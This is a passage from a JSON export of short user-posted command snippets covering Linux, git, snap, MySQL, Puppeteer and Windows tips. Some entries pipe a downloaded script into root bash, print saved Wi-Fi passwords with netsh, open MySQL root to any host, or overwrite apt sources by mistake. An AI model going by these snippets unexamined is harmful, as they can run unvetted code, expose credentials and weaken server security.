    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4294,
    "keyword": null,
    "link": null,
    "title": " set vim default editor",
    "description": "sudo update-alternatives --config editor\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4295,
    "keyword": null,
    "link": null,
    "title": " setting the upstream for a fork github",
    "description": "git remote add upstream https://thehttpslinkgoeshere.git\n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4296,
    "keyword": null,
    "link": null,
    "title": " setting up C# project with VSCode",
    "description": "# Setting up C# project with VSCode:  # 1. Open File Explorer and create a folder on your disk, then select the  #    file path and to open the Command Prompt at the current path, type: cmd  #    (For the purpose of this guide, the folder is called 'MyFolder') #    The Command Prompt should look like this: Microsoft Windows [Version 10.0.19043.1165] (c) Microsoft Corporation. All rights reserved.  C:\\Users\\name\\MyFolder>  # 2. Create .sln file and check the directory. C:\\Users\\name\\MyFolder>dotnet new sln -n \"SlnFileName\" C:\\Users\\name\\MyFolder>dir  # ('dir' lists the content of the current directory so you #  can check to see any files/folders updates)  # 3. Create new console project folder and check the directory. C:\\Users\\name\\MyFolder>dotnet new console -n \"ProjectName\" C:\\Users\\name\\MyFolder>dir  # 4. Create class library folder and check the directory. C:\\Users\\name\\MyFolder>dotnet new classlib -n \"LibraryName\" C:\\Users\\name\\MyFolder>dir # (you could use 'cls' to clear the console and make it easier to read)  # 5. Add project to solution. C:\\Users\\name\\MyFolder>dotnet sln SlnFileName.sln add ./ProjectName/ProjectName.csproj  # 6. Add library to solution. C:\\Users\\name\\MyFolder>dotnet sln SlnFileName.sln add ./LibraryName/LibraryName.csproj  # 7. Project references the library. C:\\Users\\name\\MyFolder>dotnet add ProjectName/ProjectName.csproj reference LibraryName/LibraryName.csproj  # 8. Move the command line into a new project folder and check the directory. C:\\Users\\name\\MyFolder>cd ProjectName C:\\Users\\name\\MyFolder\\ProjectName>dir  # 9. Launch VSCode from cmd. This will open VSCode with the current folder #    already open. When VSCode has launched, there should be a little pop-up #    message in the bottom right of the screen saying 'Required assets to #    build and debug are missing from 'ProjectName'. Add them?'. You want to #    click 'Yes' to add 'launch.json' and 'tasks.json' files. C:\\Users\\name\\MyFolder\\ProjectName>Code ..  # 10. Now, close VSCode. In cmd, go back one folder, to 'MyFolder'.  #     Lastly, open VSCode. Your default 'Program.cs' file should be located  #     in the 'ProjectName' folder. C:\\Users\\name\\MyFolder\\ProjectName>cd .. C:\\Users\\name\\MyFolder>Code ..  # Please comment if you have any queries/suggestions, or contact me (EAJB) # on the Grepper Discord community.\n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4297,
    "keyword": null,
    "link": null,
    "title": " settings doesn't open ubuntu",
    "description": "#install sudo apt-get update sudo apt-get install --reinstall gnome-control-center #Open Settings by gnome-control-center display gnome-control-center\nrun $ sudo apt-get install ubuntu-desktop\n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4298,
    "keyword": null,
    "link": null,
    "title": " settings not opening in ubuntu 18.04",
    "description": "sudo apt-get install --reinstall gnome-control-center \n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4299,
    "keyword": null,
    "link": null,
    "title": " settings not showing in ubuntu",
    "description": "#install sudo apt-get update sudo apt-get install --reinstall gnome-control-center #Open Settings by gnome-control-center display gnome-control-center\nrun $ sudo apt-get install ubuntu-desktop\n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4300,
    "keyword": null,
    "link": null,
    "title": " setup multiple ssh for github",
    "description": "This usually happens when you use two ssh keys to access two different GitHub account.  Follow these steps to fix this it look too long but trust me it won't take more than 5 minutes:  Step-1: Create two ssh key pairs:  ssh-keygen -t rsa -C \"your_email@youremail.com\" Step-2: It will create two ssh keys here:  ~/.ssh/id_rsa_account1 ~/.ssh/id_rsa_account2 Step-3: Now we need to add these keys:  ssh-add ~/.ssh/id_rsa_account2 ssh-add ~/.ssh/id_rsa_account1 You can see the added keys list by using this command: ssh-add -l You can remove old cached keys by this command: ssh-add -D Step-4: Modify the ssh config  cd ~/.ssh/ touch config subl -a config or code config or nano config  Step-5: Add this to config file:  #Github account1 Host github.com-account1     HostName github.com     User account1     IdentityFile ~/.ssh/id_rsa_account1  #Github account2 Host github.com-account2     HostName github.com     User account2     IdentityFile ~/.ssh/id_rsa_account2 Step-6: Update your .git/config file:  Step-6.1: Navigate to account1's project and update host:  [remote \"origin\"]         url = git@github.com-account1:account1/gfs.git If you are invited by some other user in their git Repository. Then you need to update the host like this:  [remote \"origin\"]             url = git@github.com-account1:invitedByUserName/gfs.git Step-6.2: Navigate to account2's project and update host:  [remote \"origin\"]         url = git@github.com-account2:account2/gfs.git Step-7: Update user name and email for each repository separately if required this is not an amendatory step:  Navigate to account1 project and run these:  git config user.name \"account1\" git config user.email \"account1@domain.com\"  Navigate to account2 project and run these:  git config user.name \"account2\" git config user.email \"acccount2@doamin.com\" \n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4301,
    "keyword": null,
    "link": null,
    "title": " setup mysql ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo service mysql start sudo mysql_secure_installation sudo mysql -u root   In mysql console: DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY 'YOURPASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;\nsudo /etc/init.d/mysql start or  systemctl start mysql.service\nsudo apt install mysql-server sudo mysql_secure_installation utility\napt-get install mysql-client\nsystemctl status mysql\n[mysqld]\n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4302,
    "keyword": null,
    "link": null,
    "title": " setup node and mongodb on centos 7",
    "description": "sudo systemctl start mongod \n",
    "reg_date": "2021-10-11T22:11:48.000Z"
  },
  {
    "id": 4303,
    "keyword": null,
    "link": null,
    "title": " setup puppeteer centos7",
    "description": " curl -sL https://rpm.nodesource.com/setup_10.x | sudo -E bash -  yum install nodejs    1 2 3 4 5 6 7   curl -sL https://rpm.nodesource.com/setup_10.x | sudo -E bash -   yum install nodejs       Step 2 :- Install Puppeteer In CentOS 7 npm i pupeteer 1 npm i pupeteer Step 3 :- Install Chromium In CentOS 7  yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc  1 2 3   yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc   Step 4 :- Install puppeteer in CentOs7 npm install --save puppeteer 1 npm install --save puppeteer Now Let&rsquo;s Write a Sample Code to run Puppeteer in headless mode and name that file as test.js  'use strict'; const puppeteer = require('puppeteer'); const fs = require('fs'); (async () => {   console.info(\"Starting browser\");   let browser;   try {     browser = await puppeteer.launch({});   } catch (e) {     console.info(\"Unable to launch browser mode in sandbox mode. Lauching Chrome without sandbox.\");     browser = await puppeteer.launch({args:['--no-sandbox']});   }   console.info(\"Browser successfully started\");   console.info(\"Closing browser\");   await browser.close();   console.info(\"Done\"); })(); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 'use strict'; const puppeteer = require('puppeteer'); const fs = require('fs'); (async () => {   console.info(\"Starting browser\");   let browser;   try {     browser = await puppeteer.launch({});   } catch (e) {     console.info(\"Unable to launch browser mode in sandbox mode. Lauching Chrome without sandbox.\");     browser = await puppeteer.launch({args:['--no-sandbox']});   }   console.info(\"Browser successfully started\");   console.info(\"Closing browser\");   await browser.close();   console.info(\"Done\"); })(); Step 5 :- Run the Code , you will see the following output  Setup Puppeteer In CentOS 7 running puppeteer centos7 without sandbox mode Real problem starts here , We are not able to launch browser without --no-sandbox flag.  I Challenge most of you will face this problem while you setup puppeteer in Centos 7. SO Follow down this simple hack to solve this . I struggled a lot , I think you may or may not . But if you have reached this section of article then i firmly believe you have faced this as well. For running Puppeteer in sandbox mode we need to do few changes as of now .  sudo mv chrome_sandbox chrome-sandbox sudo chown root chrome-sandbox sudo chmod 4755 chrome-sandbox 1 2 3 4   sudo mv chrome_sandbox chrome-sandbox sudo chown root chrome-sandbox sudo chmod 4755 chrome-sandbox So what are we doing here ,  We are renaming the chrome_sandbox folder to chrome-sandbox as standard chromium searches for file with chrome-sandbox. Now run the test file again.  $ node test.js    $ node test.js   Starting browser Browser successfully started Closing browser Done\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4304,
    "keyword": null,
    "link": null,
    "title": " setxkbmap toggle",
    "description": "setxkbmap -option grp:alt_shift_toggle hr, ru -variant ,phonetic  # or simply add bellow line into any startup script like .xinitrc # (Don't forget to edit and change the layouts you want to be toggled)  setxkbmap us,lk grp:alt_shift_toggle\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4305,
    "keyword": null,
    "link": null,
    "title": " sh read file line by line",
    "description": "#!/bin/bash input=\"/path/to/txt/file\" while IFS= read -r line do   echo \"$line\" done < \"$input\"\nwhile read p; do   echo \"$p\" done <peptides.txt\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4306,
    "keyword": null,
    "link": null,
    "title": " sh wait 10 seconds",
    "description": "sleep .5 # Waits 0.5 second. sleep 5  # Waits 5 seconds. sleep 5s # Waits 5 seconds. sleep 5m # Waits 5 minutes. sleep 5h # Waits 5 hours. sleep 5d # Waits 5 days.\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4307,
    "keyword": null,
    "link": null,
    "title": " shared folder virtualbox ubuntu",
    "description": "#after creating the shared folder in Virtual Box -> Settings -> Shared Folder (and making it permanent)  sudo mount -t vboxsf <Name-of-the-shared-folder> <path-to-the-directory-to-mount-to>  #This command is needed on every system reboot\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4308,
    "keyword": null,
    "link": null,
    "title": " shebang unix",
    "description": "#!/bin/bash OR  #!/usr/bin/perl OR  #!/usr/bin/python OR  #!/usr/bin/python3 OR  #!/usr/bin/env bash\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4309,
    "keyword": null,
    "link": null,
    "title": " shell count lines output",
    "description": "$ somecommand | wc -l\n",
    "reg_date": "2021-10-11T22:11:49.000Z"
  },
  {
    "id": 4310,
    "keyword": null,
    "link": null,
    "title": " shell count number of lines",
    "description": "$ wc -l < /dir/file.txt 3272485\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4311,
    "keyword": null,
    "link": null,
    "title": " shell get size of directory",
    "description": "du -h your_directory # gives you the size of your target directory. du -hcs your_directory # If you want a brief output.\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4312,
    "keyword": null,
    "link": null,
    "title": " shell hide tab",
    "description": "public AppShell() {     InitializeComponent();      Shell.SetTabBarIsVisible(this, false); }\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4313,
    "keyword": null,
    "link": null,
    "title": " shell open program",
    "description": "#You can launch a program by typing its name at the prompt: firefox  Terminal commands can also accept arguments: firefox youtube.com\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4314,
    "keyword": null,
    "link": null,
    "title": " shell promt user input",
    "description": "#!/bin/bash  read -p \"Enter Your Name: \"  username echo \"Welcome $username!\"\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4315,
    "keyword": null,
    "link": null,
    "title": " shell script current time",
    "description": "#!/bin/bash now=\"$(date)\" printf \"Current date and time %s\\n\" \"$now\"   now=\"$(date +'%d/%m/%Y')\" printf \"Current date in dd/mm/yyyy format %s\\n\" \"$now\"   echo \"Starting backup at $now, please wait...\" # command to backup scripts goes here # ...\ndate +'FORMAT'   ### mm/dd/yyyy ### date +'%m/%d/%Y'   ## Time in 12 hr format ### date +'%r'   ## backup dir format ## backup_dir=$(date +'%m/%d/%Y') echo \"Backup dir for today: /nas04/backups/${backup_dir}\"\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4316,
    "keyword": null,
    "link": null,
    "title": " shell script to check the directory exists",
    "description": "Directory=\"/opt\" if [ -d \"$Directory\" ]; then \techo -e \"it's exits\\n\" fi ### To check if it's not exists if [ ! -d \"$Directory\" ]; then  \techo -e \"It's not there\\n\" fi\nDIR=\"/etc/httpd/\" if [ -d \"$DIR\" ]; then   ### Take action if $DIR exists ###   echo \"Installing config files in ${DIR}...\" else   ###  Control will jump here if $DIR does NOT exists ###   echo \"Error: ${DIR} not found. Can not continue.\"   exit 1 fi\n",
    "reg_date": "2021-10-11T22:11:50.000Z"
  },
  {
    "id": 4317,
    "keyword": null,
    "link": null,
    "title": " shell script to count number of lines in a file",
    "description": "$ somecommand | wc -l\n$ wc -l < /dir/file.txt 3272485\necho Enter the filename read file w=`cat $file | wc -w` c=`cat $file | wc -c` l=`grep -c \".\" $file` echo Number of characters in $file is $c echo Number of words in $file is $w echo Number of lines in $file is $l \n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4318,
    "keyword": null,
    "link": null,
    "title": " shell strip quotes",
    "description": "temp=\"${opt%\\\"}\" temp=\"${temp#\\\"}\" echo \"$temp\" \n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4319,
    "keyword": null,
    "link": null,
    "title": " shell substring last characters",
    "description": "echo -n $str | tail -c 1 # gets the last character, increase number to get more characters\n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4320,
    "keyword": null,
    "link": null,
    "title": " shell themes for ubuntu",
    "description": "terminal.sexy  Export the theme for Gnome Shell, save the text as .sh and execute it. \n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4321,
    "keyword": null,
    "link": null,
    "title": " shell version ubuntu 20.04",
    "description": "gnome-shell --version \n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4322,
    "keyword": null,
    "link": null,
    "title": " shell write multiple lines to file",
    "description": "#!/bin/bash  cat > /path/to/myfile <<EOL write whatever youwant with multiple lines ...  EOL\n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4323,
    "keyword": null,
    "link": null,
    "title": " shopify hot reload",
    "description": " #install browser-sync npm install -g browser-sync  #create new theme with themekit theme new --password=[your-password] --store=[your-store.myshopify.com] --name=[theme name]  #watch theme theme watch #or theme watch --allow-live --notify=/tmp/theme.update   #to fix browser-sync issues ie: showing code on top of the page #create a bs-config file browser-sync init  # add/paste this snippet to the file under preferably \"middleware\":false       snippetOptions: {         rule: {             match: /<\\/body>/i,              fn: function (snippet, match){                 return snippet + match;             },         },     },  # start developer server browser-sync start --proxy \"https://<mystore>.myshopify.com/\" --files /tmp/theme.update --reload-delay 1000 --config bs-config.js    \n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4324,
    "keyword": null,
    "link": null,
    "title": " show all processes linux",
    "description": "ps -aux | less\nps -ef   OR  ps -ef | grep <process-to-filter>  e.g  ps-ef | grep node\nps top w\nhtop\n",
    "reg_date": "2021-10-11T22:11:51.000Z"
  },
  {
    "id": 4325,
    "keyword": null,
    "link": null,
    "title": " show all remote branches git",
    "description": "git branch -r \ngit remote show <remote-name> \ngit for-each-ref --format=' %(authorname) \t %(refname)' --sort=authorname  \ngit ls-remote --heads <remote-name> \n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4326,
    "keyword": null,
    "link": null,
    "title": " show all running service linux",
    "description": "## List all services systemctl list-units  --type=service  ## List running services systemctl list-units  --type=service  --state=running  ## List all svc in simplified way service --status-all\n//to see all runninig services sudo service --status-all | grep +   //to start service sudo service [service name] start  //to stop service sudo service [service name] stop    // to see specific service status sudo service [service name] status \n$ sudo service httpd start Starting httpd:                                            [  OK  ] \n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4327,
    "keyword": null,
    "link": null,
    "title": " show applications shortcut ubuntu move right",
    "description": "gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top true\n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4328,
    "keyword": null,
    "link": null,
    "title": " show conflcited files",
    "description": "git diff --name-only --diff-filter=U \n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4329,
    "keyword": null,
    "link": null,
    "title": " show conflicts git",
    "description": "git diff --name-only --diff-filter=U \n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4330,
    "keyword": null,
    "link": null,
    "title": " show date linux",
    "description": "date +\"%d-%m-%y\"\n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4331,
    "keyword": null,
    "link": null,
    "title": " show detail all changes in a git log",
    "description": "git log --stat #displays modified files, number of lines added/removed and summary line with #total number of modified fiels git log -p #displays modified files, number of lines added/removed and the actual changes #that have been made.\n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4332,
    "keyword": null,
    "link": null,
    "title": " show directory size linux",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -h --max-depth=1\ndf -sh .\ndu -sh /home/george 2.1G    /home/george \ndu -sh folder/ \n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4333,
    "keyword": null,
    "link": null,
    "title": " show fortigate uptime",
    "description": "# get system performance status | grep Uptime\n",
    "reg_date": "2021-10-11T22:11:52.000Z"
  },
  {
    "id": 4334,
    "keyword": null,
    "link": null,
    "title": " show gpus",
    "description": "nvidia-smi \n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4335,
    "keyword": null,
    "link": null,
    "title": " show internet password",
    "description": "1. Open Commands Promt (Doesnt Matter if Administartive mode) 2. Paste This Code & Press Enter  netsh wlan show profile name=INTERNET-NAME key=clear 3. Search For Something Called \"Key Content\", Thats Your Password  ## NOTE : This Might Not Work on Publice Networks Like Hospital, ## School, Muncipality Etc Networks\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4336,
    "keyword": null,
    "link": null,
    "title": " show ip address linux",
    "description": "#private ip hostname -I or ifconfig or ip addr show  #public ip curl ifconfig.me\nifconfig -a\n$ hostname -I  \ncurl ifconfig.me\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4337,
    "keyword": null,
    "link": null,
    "title": " show ip in docker",
    "description": "docker-ip YOUR_CONTAINER_ID \ndocker inspect <container_ID Or container_name> |grep 'IPAddress' \ndocker inspect <container_ID Or container_name> |grep 'Port' \ndocker inspect -f '{{.Name}} - {{.NetworkSettings.IPAddress }}' $(docker ps -aq) \ndocker inspect --format='{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -aq) \ndocker exec [container-id or container-name] cat /etc/hosts 172.17.0.26 d8bc98fa4088 127.0.0.1   localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.17 mysql \n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4338,
    "keyword": null,
    "link": null,
    "title": " show linux distro",
    "description": "#Get details about linux distro cat /etc/os-release\ncat /etc/*-release & uname -a\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4339,
    "keyword": null,
    "link": null,
    "title": " show mongodb version",
    "description": "mongod --version\nmongo --version\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4340,
    "keyword": null,
    "link": null,
    "title": " show port list in centos",
    "description": "# netstat -tulnp\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4341,
    "keyword": null,
    "link": null,
    "title": " show rights inside folder debian",
    "description": "$ ls -ld directory\n",
    "reg_date": "2021-10-11T22:11:53.000Z"
  },
  {
    "id": 4342,
    "keyword": null,
    "link": null,
    "title": " show weather top bar in ubuntu",
    "description": "sudo apt install gnome-shell-extension-weather Press Alt+F2 then press r\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4343,
    "keyword": null,
    "link": null,
    "title": " shrink terminal current directory",
    "description": "PROMPT_DIRTRIM=1\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4344,
    "keyword": null,
    "link": null,
    "title": " shut down instantly on linux",
    "description": "sudo shutdown now\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4345,
    "keyword": null,
    "link": null,
    "title": " shutdown heroku app",
    "description": "stop with: $ heroku ps:scale web=0  and start with: $ heroku ps:scale web=1 \nFrom The Heroku Webpage Dashboard => Your App Name => Resources => Pencil icon=> Flip the switch => Confirm\n$ heroku ps:scale web=0 Scaling web processes... done, now running 0 //once ready to go back online: heroku ps:scale web=1\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4346,
    "keyword": null,
    "link": null,
    "title": " shutdown timer windows 10",
    "description": "shutdown -s -t SECONDS\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4347,
    "keyword": null,
    "link": null,
    "title": " shutdown windows terminal",
    "description": "shutdown -s -t 0\n#Shutdown sudo shutdown -h now #or sudo shutdown -h [TIME]   #Reboot sudo reboot\n",
    "reg_date": "2021-10-11T22:11:54.000Z"
  },
  {
    "id": 4348,
    "keyword": null,
    "link": null,
    "title": " skype linux install",
    "description": "sudo apt update sudo apt install snapd sudo snap install skype -- classic\nyum install psmisc  \n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4349,
    "keyword": null,
    "link": null,
    "title": " slack for linux mint",
    "description": "sudo snap install slack --classic\n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4350,
    "keyword": null,
    "link": null,
    "title": " slack ubuntu download 20.04",
    "description": "sudo snap install slack --classic\n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4351,
    "keyword": null,
    "link": null,
    "title": " sleep command bash",
    "description": "sleep .5 # Waits 0.5 second. sleep 5  # Waits 5 seconds. sleep 5s # Waits 5 seconds. sleep 5m # Waits 5 minutes. sleep 5h # Waits 5 hours. sleep 5d # Waits 5 days.\nsleep NUMBER[SUFFIX]\t#Just use this command structure to wait/sleep #Example: sleep 5m\t#sleeps 5 minutes sleep 0.1\t\t#sleeps 0.1 seconds or 100 miliseconds #Suffixes s - seconds (default) m - minutes h - hours d - days When no suffix is specified, it defaults to seconds.\nsleep .5 # Waits 0.5 second. sleep 5  # Waits 5 seconds. sleep 5s # Waits 5 seconds. sleep 5m # Waits 5 minutes. sleep 5h # Waits 5 hours. sleep 5d # Waits 5 days. \n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4352,
    "keyword": null,
    "link": null,
    "title": " slurmstepd: error: Detected 1 oom-kill event(s) in step 3475229.batch cgroup. Some of your processes may have been killed by the cgroup out-of-memory handler.",
    "description": "# Error: slurmstepd: error: Detected 1 oom-kill event(s) in step 3475229.batch  cgroup. Some of your processes may have been killed by the cgroup  out-of-memory handler.  # Explanation: # When Linux runs low on memory, it will \"oom-kill\" a process to keep  # critical processes running. It looks like slurmstepd detected that  # your process was oom-killed.  # Solution: # For me, adding this line to my slurm submission script fixed the issue: #SBATCH --mem=40G  # The source also mentions adding the following, but I didn't test it: #SBATCH --mem-per-cpu=<more memory than you've previously requested>\n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4353,
    "keyword": null,
    "link": null,
    "title": " snap install",
    "description": "sudo snap install postman\nsudo apt update sudo apt install snapd\n#Ubuntu and Debian sudo apt update sudo apt install snapd  #CentOS and RHEL yum install epel-release  yum install snapd  #Fedora dnf install snapd\nOn Linux Mint 20, /etc/apt/preferences.d/nosnap.pref needs to be removed before Snap can be installed. This can be accomplished from the command line:  sudo rm /etc/apt/preferences.d/nosnap.pref sudo apt update  To install snap from the Software Manager application, search for snapd and click Install. Alternatively, snapd can be installed from the command line:   sudo apt install snapd  Either restart your machine, or log out and in again, to complete the installation.  Install Snap Store To install Snap Store, simply use the following command:  sudo snap install snap-store  \nThe Best way to install Snapd On linux sudo apt update sudo apt install snapd\n------------ [On Debian and Ubuntu] ------------  $ sudo apt update  $ sudo apt install snapd  ------------ [On Fedora Linux] ------------ # dnf install snapd\t\t\t  ------------ [On CentOS and RHEL] ------------ # yum install epel-release  # yum install snapd\t\t  ------------ [On openSUSE - replace openSUSE_Leap_15.0 with the version] ------------ $ sudo zypper addrepo --refresh https://download.opensuse.org/repositories/system:/snappy/openSUSE_Leap_15.0 snappy $ sudo zypper --gpg-auto-import-keys refresh $ sudo zypper dup --from snappy $ sudo zypper install snapd  ------------ [On Manjaro Linux] ------------ # pacman -S snapd  ------------ [On Arch Linux] ------------ # git clone https://aur.archlinux.org/snapd.git # cd snapd # makepkg -si \n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4354,
    "keyword": null,
    "link": null,
    "title": " snap install android studio",
    "description": "sudo snap install android-studio --classic\n",
    "reg_date": "2021-10-11T22:11:55.000Z"
  },
  {
    "id": 4355,
    "keyword": null,
    "link": null,
    "title": " snap install atom",
    "description": "sudo snap install atom --classic\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4356,
    "keyword": null,
    "link": null,
    "title": " snap install clion",
    "description": "sudo snap install clion --classic\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4357,
    "keyword": null,
    "link": null,
    "title": " snap install slack",
    "description": "sudo snap install slack --classic\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4358,
    "keyword": null,
    "link": null,
    "title": " snap store android studio",
    "description": "sudo snap install android-studio --classic\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4359,
    "keyword": null,
    "link": null,
    "title": " snap uninstall",
    "description": "sudo snap remove <package name>\nsudo snap remove packageName\nsudo snap remove <package>\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4360,
    "keyword": null,
    "link": null,
    "title": " snapd unavailable solved",
    "description": "# you need to start snapd service # the below command will start it systemctl start snapd\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4361,
    "keyword": null,
    "link": null,
    "title": " snapd version",
    "description": "snap version\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4362,
    "keyword": null,
    "link": null,
    "title": " sort numerically in linux ls",
    "description": "ls -v\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4363,
    "keyword": null,
    "link": null,
    "title": " source.list kali linux",
    "description": "Try this: sudo apt-get update --fix-missing\necho \"deb http://http.kali.org/kali kali-rolling main non-free contrib\" | sudo tee /etc/apt/sources.list echo \"deb http://http.kali.org/kali kali-last-snapshot main non-free contrib\" | sudo tee /etc/apt/sources.list echo \"deb http://http.kali.org/kali kali-experimental main non-free contrib\" | sudo tee -a /etc/apt/sources.list\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4364,
    "keyword": null,
    "link": null,
    "title": " source fish config",
    "description": "echo 'source ~/.profile;clear;' >  ~/.config/fish/config.fish\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4365,
    "keyword": null,
    "link": null,
    "title": " space in dock mac",
    "description": "defaults write com.apple.dock persistent-apps -array-add '{\"tile-type\"=\"spacer-tile\";}' #When the terminal prompt appears again type the following command killall Dock\n",
    "reg_date": "2021-10-11T22:11:56.000Z"
  },
  {
    "id": 4366,
    "keyword": null,
    "link": null,
    "title": " spacy install",
    "description": "conda install -c conda-forge spacy python -m spacy download en_core_web_sm\npip install -U spacy\n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4367,
    "keyword": null,
    "link": null,
    "title": " spec false not working",
    "description": "ng generate component --skipTests=true component-name \n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4368,
    "keyword": null,
    "link": null,
    "title": " specify origin git",
    "description": "git remote add origin git@github.com:User/UserRepo.git \n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4369,
    "keyword": null,
    "link": null,
    "title": " speed up video with ffmpeg",
